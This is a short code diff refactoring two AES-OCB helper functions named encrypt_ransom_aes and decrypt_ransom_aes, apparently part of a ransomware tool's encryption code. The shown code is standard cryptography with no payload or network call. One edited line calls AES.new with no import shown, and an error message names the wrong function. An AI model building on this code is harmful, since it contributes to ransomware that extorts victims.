@@ -211,7 +211,7 @@ def encrypt_ransom_aes(plaintext, key, padding=chr(0)):
     try:
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
         ciphertext, tag = cipher.encrypt_and_digest(plaintext)
-        output = b''.join((cipher.nonce, tag, ciphertext))
+        output = cipher.nonce + tag + ciphertext
     except Exception as e:
         log("{} error: {}".format(decrypt_files.__name__, str(e)))
         return traceback.format_exc()
@@ -243,7 +243,7 @@ def decrypt_ransom_aes(encrypted, key, padding=chr(0)):
         ciphertext = data.read()  # Remaining bytes
         
         # Initialize the cipher with the nonce
-        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce=nonce)
+        cipher = AES.new(key, AES.MODE_OCB, nonce=nonce)
         
         # Decrypt and verify the ciphertext
         plaintext = cipher.decrypt_and_verify(ciphertext, tag)
